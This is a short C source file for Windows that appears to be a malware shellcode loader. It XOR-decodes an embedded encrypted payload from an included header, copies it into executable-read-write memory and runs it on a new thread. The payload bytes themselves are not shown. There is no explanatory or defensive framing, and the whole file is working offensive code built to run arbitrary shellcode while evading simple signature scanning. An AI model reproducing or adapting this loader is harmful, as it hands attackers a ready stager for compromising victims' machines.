#include <windows.h>
#include "shellcode_enc.h"

#define XOR_KEY 0x5A

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpCmd, int nShow) {
    (void)hI; (void)hP; (void)lpCmd; (void)nShow;

    unsigned char *buf = (unsigned char *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len);
    if (!buf) return 1;

    for (unsigned int i = 0; i < payload_len; i++)
        buf[i] = payload[i] ^ XOR_KEY;

    LPVOID mem = VirtualAlloc(NULL, payload_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem) { HeapFree(GetProcessHeap(), 0, buf); return 1; }

    memcpy(mem, buf, payload_len);
    SecureZeroMemory(buf, payload_len);
    HeapFree(GetProcessHeap(), 0, buf);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) return 1;

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
